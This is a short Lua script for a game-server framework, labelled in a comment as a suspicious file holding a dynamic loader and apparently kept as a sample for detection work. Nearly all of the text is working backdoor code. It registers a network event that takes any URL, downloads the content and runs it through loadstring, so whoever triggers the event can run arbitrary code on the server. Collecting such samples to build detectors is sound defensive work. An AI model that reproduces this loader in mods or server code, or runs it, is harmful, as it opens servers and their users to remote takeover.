
-- Suspicious Lua file containing a dynamic loader
RegisterNetEvent("loadCode")
AddEventHandler("loadCode", function(remoteUrl)
    PerformHttpRequest(remoteUrl, function(code, text)
        local load_fn = loadstring(text)
        if load_fn then
            load_fn()
        end
    end)
end)
